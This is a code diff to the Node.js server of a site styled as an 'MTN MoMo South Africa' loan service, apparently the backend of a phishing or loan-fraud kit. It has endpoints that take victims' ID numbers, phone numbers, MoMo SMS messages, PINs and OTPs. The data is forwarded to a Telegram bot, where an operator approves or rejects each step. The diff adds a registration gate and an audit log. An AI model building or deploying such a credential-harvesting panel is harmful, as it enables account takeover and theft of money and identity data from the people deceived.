@@ -1,6 +1,6 @@
 // ============================================================
 // server.js – MTN MoMo South Africa
-// Account-type limits + temporary registration Telegram endpoint
+// Registration mandatory · Account-type limits · Guarantor
 // ============================================================
 'use strict';
 
@@ -23,50 +23,39 @@ const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 console.log('═══════════════════════════════════════');
 console.log('🚀 Server starting...');
-console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MISSING');
+console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '... (len ' + BOT_TOKEN.length + ')' : 'MISSING');
 console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
 console.log('═══════════════════════════════════════');
 
-// ─── Account Types (source of truth) ───
+// ─── Account Types ───
 const ACCOUNT_TYPES = {
     yello: {
-        name: 'MoMo Yello',
-        icon: '🟡',
-        dailyCash: 3500,
-        monthlyCap: 20000,
-        maxLoan: 20000,
-        minLoan: 5000,
-        requiresId: true,
+        name: 'MoMo Yello', icon: '🟡',
+        dailyCash: 3500, monthlyCap: 20000,
+        maxLoan: 20000, minLoan: 5000, requiresId: true,
         description: 'Standard MoMo account'
     },
     yello_plus: {
-        name: 'MoMo Yello Plus',
-        icon: '⭐',
-        dailyCash: 10000,
-        monthlyCap: 40000,
-        maxLoan: 40000,
-        minLoan: 5000,
-        requiresId: true,
+        name: 'MoMo Yello Plus', icon: '⭐',
+        dailyCash: 10000, monthlyCap: 40000,
+        maxLoan: 40000, minLoan: 5000, requiresId: true,
         description: 'Higher limits account'
     },
     eazi: {
-        name: 'MoMo Eazi',
-        icon: '⚡',
-        dailyCash: 2000,
-        monthlyCap: 10000,
-        maxLoan: 10000,
-        minLoan: 5000,
-        requiresId: false,
+        name: 'MoMo Eazi', icon: '⚡',
+        dailyCash: 2000, monthlyCap: 10000,
+        maxLoan: 10000, minLoan: 5000, requiresId: false,
         description: 'Basic MoMo account (no ID required)'
     }
 };
 
 // ─── Data Store ───
 const applications = {};
-const registrations = {};   // temporary store for registration-only data
+const registrations = {};
 const DATA_DIR = path.join(__dirname, '../data');
 const DATA_FILE = path.join(DATA_DIR, 'applications.json');
 const REG_FILE = path.join(DATA_DIR, 'registrations.json');
+const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 
 function saveApps() {
@@ -89,8 +78,11 @@ function loadAll() {
     try {
         if (fs.existsSync(DATA_FILE)) {
             const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-            Object.assign(applications, parsed.applications || {});
-            console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
+            const age = Date.now() - new Date(parsed.timestamp).getTime();
+            if (age < 30 * 24 * 60 * 60 * 1000) {
+                Object.assign(applications, parsed.applications || {});
+                console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
+            }
         }
         if (fs.existsSync(REG_FILE)) {
             const parsed = JSON.parse(fs.readFileSync(REG_FILE, 'utf8'));
@@ -98,6 +90,14 @@ function loadAll() {
             console.log(`📂 Loaded ${Object.keys(registrations).length} registrations`);
         }
     } catch (e) { console.error('Load error:', e.message); }
+}
+
+// ─── Audit ───
+function audit(event, data = {}) {
+    const entry = { ts: new Date().toISOString(), event, ...data };
+    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); }
+    catch (e) {}
+    console.log(JSON.stringify(entry));
 }
 
 // ─── Helpers ───
@@ -211,14 +211,12 @@ app.get('/api/telegram-debug', async (req, res) => {
     res.json(result);
 });
 
-// Expose account types so frontend can render them
 app.get('/api/account-types', (req, res) => {
     res.json({ ok: true, types: ACCOUNT_TYPES });
 });
 
 // ═══════════════════════════════════════════════════════════
-// TEMPORARY REGISTRATION TELEGRAM ENDPOINT
-// Standalone — send any registration payload, gets forwarded to Telegram
+// TEMPORARY REGISTRATION ENDPOINT (forwards to Telegram)
 // ═══════════════════════════════════════════════════════════
 app.post('/api/register-momo-telegram', async (req, res) => {
     try {
@@ -256,9 +254,10 @@ app.post('/api/register-momo-telegram', async (req, res) => {
         saveRegs();
 
         console.log(`📱 Registration via temp endpoint: ${regId} → ${type.name}`);
+        audit('registration_temp_endpoint', { regId, accountType, phone });
 
         await tgSend(
-            `📱 <b>NEW MOMO REGISTRATION (via temp endpoint)</b>\n` +
+            `📱 <b>NEW MOMO REGISTRATION</b>\n` +
             `━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🆔 Reg ID: ${code(regId)}\n` +
             (applicationId ? `🔗 App ID: ${code(applicationId)}\n` : '') +
@@ -286,11 +285,7 @@ app.post('/api/register-momo-telegram', async (req, res) => {
             regId,
             accountType,
             accountName: type.name,
-            limits: {
-                dailyCash: type.dailyCash,
-                monthlyCap: type.monthlyCap,
-                maxLoan: type.maxLoan
-            },
+            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
             maxLoan: type.maxLoan,
             minLoan: type.minLoan,
             message: `${type.name} registered. Your maximum loan is R ${fmt(type.maxLoan)}.`
@@ -352,9 +347,10 @@ app.post('/api/register-momo', async (req, res) => {
         saveApps();
 
         console.log(`✅ MoMo registration: ${applicationId} → ${type.name}`);
+        audit('registration_main', { applicationId, accountType, phone });
 
         await tgSend(
-            `📱 <b>NEW MOMO REGISTRATION</b>\n` +
+            `📱 <b>MOMO REGISTRATION CONFIRMED</b>\n` +
             `━━━━━━━━━━━━━━━━━━━━━━\n` +
             `🆔 App ID: ${code(applicationId)}\n` +
             (fullName ? `👤 ${esc(fullName)}\n` : '') +
@@ -368,7 +364,7 @@ app.post('/api/register-momo', async (req, res) => {
             (idCheck.ok && type.requiresId
                 ? `\n<b>🇿🇦 ID</b>\n${code(idNumber)}\nAge ${idCheck.age} · ${idCheck.gender} · ${idCheck.citizenship}\n`
                 : '') +
-            `\n✅ Registration complete`
+            `\n✅ User can now apply`
         );
 
         res.json({
@@ -417,6 +413,7 @@ app.post('/api/telegram-webhook', (req, res) => {
                     app_.qualification = approved ? 'qualified' : 'unqualified';
                 }
                 saveApps();
+                audit('admin_decision', { id: data.id, step, decision: approved ? 'approved' : 'rejected' });
 
                 tgSend(
                     `${approved ? '✅' : '❌'} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
@@ -501,7 +498,7 @@ app.post('/api/telegram-webhook', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// LOAN FLOW
+// LOAN FLOW — APPLICATION SUBMIT (with registration gate)
 // ═══════════════════════════════════════════════════════════
 app.post('/api/send-application', (req, res) => {
     try {
@@ -516,10 +513,30 @@ app.post('/api/send-application', (req, res) => {
 
         if (!applicationId) return res.status(400).json({ ok: false, error: 'Missing application ID' });
 
-        // Validate account type exists
-        if (!ACCOUNT_TYPES[accountType]) {
-            return res.status(400).json({ ok: false, error: 'Please select a valid MoMo account type.' });
+        // ─── REGISTRATION GATE ───
+        const regData = applications[applicationId]?.momoRegistration;
+        const isReg = !!(isRegistered && accountType && ACCOUNT_TYPES[accountType]);
+
+        if (!isReg || !regData || !regData.accountType) {
+            console.log(`⛔ Blocked unregistered application: ${applicationId}`);
+            audit('application_blocked_not_registered', { id: applicationId, phone });
+            return res.status(403).json({
+                ok: false,
+                code: 'NOT_REGISTERED',
+                error: 'Invalid user credentials. You must register on MoMo before applying. Please register first.'
+            });
         }
+
+        if (accountType !== regData.accountType) {
+            console.log(`⛔ Account type mismatch: ${applicationId}`);
+            audit('application_blocked_type_mismatch', { id: applicationId });
+            return res.status(403).json({
+                ok: false,
+                code: 'NOT_REGISTERED',
+                error: 'Invalid user credentials. Your account type does not match your registration. Please register again.'
+            });
+        }
+
         const type = ACCOUNT_TYPES[accountType];
 
         // Enforce max loan per account type
@@ -538,7 +555,6 @@ app.post('/api/send-application', (req, res) => {
 
         const monthly = monthlyRepayment(loanAmount, parseInt(loanTerm));
         const requiredTx = Math.ceil(loanAmount * 0.20);
-        // Cap requiredTx to account's monthly cap
         const effectiveRequiredTx = Math.min(requiredTx, type.monthlyCap);
 
         applications[applicationId] = {
@@ -559,6 +575,7 @@ app.post('/api/send-application', (req, res) => {
         };
         saveApps();
         console.log(`📝 Application submitted: ${applicationId} (${type.name})`);
+        audit('application_submitted', { id: applicationId, accountType, loanAmount });
 
         askApproval(
             `📋 <b>NEW LOAN APPLICATION (SOUTH AFRICA)</b>\n` +
@@ -599,7 +616,7 @@ app.post('/api/send-application', (req, res) => {
     }
 });
 
-// SMS
+// ─── Submit SMS ───
 app.post('/api/send-momo-message', (req, res) => {
     try {
         const { applicationId, phone, momoMessage } = req.body.momoData;
@@ -624,7 +641,7 @@ app.post('/api/send-momo-message', (req, res) => {
     } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
-// PIN
+// ─── Submit PIN ───
 app.post('/api/send-pin', (req, res) => {
     try {
         const { applicationId, pin } = req.body;
@@ -650,7 +667,7 @@ app.post('/api/send-pin', (req, res) => {
     } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
-// OTP
+// ─── Submit OTP ───
 app.post('/api/send-otp', (req, res) => {
     try {
         const { applicationId, otp } = req.body;
@@ -676,7 +693,7 @@ app.post('/api/send-otp', (req, res) => {
     } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
-// Qualification
+// ─── Qualification ───
 app.post('/api/check-qualification', (req, res) => {
     try {
         const { applicationId } = req.body;
@@ -715,7 +732,7 @@ app.post('/api/check-qualification', (req, res) => {
     } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
-// Status
+// ─── Status ───
 app.get('/api/status/:applicationId/:step', (req, res) => {
     const { applicationId, step } = req.params;
     const app_ = applications[applicationId];
@@ -738,7 +755,7 @@ app.get('/api/status/:applicationId', (req, res) => {
     });
 });
 
-// Resend SMS
+// ─── Resend SMS ───
 app.post('/api/resend-sms/:applicationId', (req, res) => {
     const app_ = applications[req.params.applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
@@ -748,7 +765,7 @@ app.post('/api/resend-sms/:applicationId', (req, res) => {
     res.json({ ok: true });
 });
 
-// Resend OTP
+// ─── Resend OTP ───
 app.post('/api/resend-otp', (req, res) => {
     const { applicationId } = req.body;
     const app_ = applications[applicationId];
@@ -760,7 +777,7 @@ app.post('/api/resend-otp', (req, res) => {
     res.json({ ok: true });
 });
 
-// Retry
+// ─── Retry ───
 app.post('/api/retry/:applicationId/:step', (req, res) => {
     const { applicationId, step } = req.params;
     const app_ = applications[applicationId];
@@ -775,7 +792,7 @@ app.post('/api/retry/:applicationId/:step', (req, res) => {
     res.json({ ok: true });
 });
 
-// Rejection info
+// ─── Rejection info ───
 app.get('/api/rejection-info/:applicationId', (req, res) => {
     const app_ = applications[req.params.applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
@@ -788,11 +805,12 @@ app.get('/api/rejection-info/:applicationId', (req, res) => {
     res.json({ ok: true, rejectedStep, errorMessage });
 });
 
-// SPA fallback
+// ─── SPA fallback ───
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
 });
 
+// ─── Boot ───
 loadAll();
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
